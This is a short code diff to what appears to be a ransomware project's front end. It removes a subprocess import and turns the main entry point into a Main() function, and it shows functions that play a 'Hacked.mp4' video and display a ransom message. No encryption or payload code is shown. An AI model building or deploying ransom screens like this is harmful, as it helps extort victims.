@@ -1,7 +1,6 @@
 import cv2
 import tkinter as tk
 from tkinter import messagebox
-import subprocess
 from restorer_ware import restore_files_in_directory 
 
 def validate_and_submit(window):
@@ -113,7 +112,8 @@ def show_ransom_message():
 
     window.mainloop()
 
-if __name__ == "__main__":
+
+def Main():
     video_path = "Hacked.mp4" 
     play_video(video_path)
     show_ransom_message()
